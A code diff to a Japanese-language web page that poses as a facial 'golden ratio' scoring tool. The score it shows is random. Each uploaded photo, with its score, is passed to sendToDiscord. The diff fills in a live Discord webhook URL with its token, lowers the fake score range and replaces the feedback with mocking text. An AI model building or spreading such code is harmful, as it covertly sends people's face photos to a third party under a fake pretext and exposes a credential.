@@ -142,12 +142,12 @@ button:active {
 </div>
 
 <script>
-const WEBHOOK_URL = "ここにDiscordのWebhookURL";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
 function send() {
   const file = document.getElementById("file").files[0];
   if (!file) {
-    alert("画像を選んでね");
+    alert("画像選ばねえと診断できんわかす");
     return;
   }
 
@@ -158,14 +158,14 @@ function send() {
     document.getElementById("preview").src = base64;
     document.getElementById("previewBox").style.display = "block";
 
-    const score = Math.floor(70 + Math.random() * 25);
+    const score = Math.floor(30 + Math.random() * 25);
     const rank = score >= 90 ? "S" : score >= 80 ? "A" : "B";
 
     document.getElementById("result").style.display = "block";
     document.getElementById("result").innerHTML = `
       <div class="rank">ランク ${rank}</div>
       黄金比スコア：<b>${score}%</b><br>
-      全体的にバランスの良い顔立ちです
+      うんいいと思うよ、うんｗ
     `;
 
     sendToDiscord(base64, score, rank);
